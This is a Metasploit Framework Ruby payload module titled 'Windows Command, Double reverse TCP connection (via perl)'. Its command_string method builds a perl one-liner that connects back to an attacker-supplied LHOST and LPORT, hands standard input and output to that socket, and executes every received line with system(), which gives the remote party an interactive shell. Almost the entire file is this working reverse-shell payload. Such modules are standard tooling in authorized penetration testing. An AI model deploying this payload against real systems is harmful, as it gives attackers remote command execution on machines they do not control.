##
# $Id: reverse_perl.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Command, Double reverse TCP connection (via perl)',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Creates an interactive shell via perl',
			'Author'        => ['cazz', 'patrick'],
			'License'       => BSD_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string

		cmd = "perl -MIO -e \"$c=new IO::Socket::INET(PeerAddr,\\\"#{datastore['LHOST']}:#{datastore['LPORT']}\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\""

	end

end